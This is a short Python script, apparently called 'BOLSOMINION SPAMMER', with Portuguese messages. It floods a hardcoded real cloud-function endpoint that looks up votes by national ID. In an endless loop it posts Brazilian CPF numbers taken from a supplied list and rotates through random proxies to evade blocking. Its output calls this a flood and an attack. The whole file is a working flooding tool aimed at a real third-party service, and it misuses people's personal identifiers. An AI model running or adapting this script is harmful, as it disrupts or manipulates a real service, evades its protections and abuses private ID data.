import requests, random, argparse
from sys import exit

url_atk = "https://southamerica-east1-healthy-return-370916.cloudfunctions.net/get-vote-from-national-id"

banner = """
  _           _                                                           
 | |         | |                                                          
 | |__   ___ | |___  ___    ___ _ __   __ _ _ __ ___  _ __ ___   ___ _ __ 
 | '_ \ / _ \| / __|/ _ \  / __| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 | |_) | (_) | \__ \ (_) | \__ \ |_) | (_| | | | | | | | | | | |  __/ |   
 |_.__/ \___/|_|___/\___/  |___/ .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|   
  /\//\/|       _              | |             ______                     
 |/\//\/       | |             |_|            / /___ \                    
            ___| |_ ___ _ __ ___  ___  ___   / /  __) |                   
           / _ \ __/ _ \ '__/ __|/ _ \/ __| < <  |__ <                    
          |  __/ ||  __/ |  \__ \  __/ (__   \ \ ___) |                   
           \___|\__\___|_|  |___/\___|\___|   \_\____/                    
                                                                          
                                                                          

"""
print(banner)

parser = argparse.ArgumentParser(usage="python spammer.py -cpfs cpfs.txt -proxys proxys.txt", description="ETERSEC - BOLSOMINION SPAMMER!")

parser.add_argument("-cpfs", type=str, help="Caminho para o arquivo de cpfs", required=True)
parser.add_argument("-proxys", type=str, help="Caminho para o arquivo de proxys (ip:porta)", required=True)
args = parser.parse_args()

cpfs_file = args.cpfs
proxys_file = args.proxys


try:
    with open(f"{proxys_file}") as fp:
        proxys = fp.read().splitlines()

    with open(f"{cpfs_file}") as fp:
        cpfs = fp.read().splitlines()
except:
    print("[!] Houve um erro ao formatar algum dos arquivos.")
    exit()

def proxy_request(url):
    while True:
        try:
            proxy = {"http": random.choice(proxys)}
            cpf = random.choice(cpfs)
            response = requests.post(url, proxies=proxy, timeout=5, json={"national_id": f"{cpf}"})
            if response.status_code == 200:
                print(f"[~] Sucesso: Flood com CPF: {cpf} // via proxy {proxy} (use ctrl + c para pausar)")
            break
        except KeyboardInterrupt:
            print("[!] Ataque pausado por interferência manual.")
            exit()
        except:
            print("[-] Erro, tentando outra proxy.")
    return

while True:
    proxy_request(url_atk)
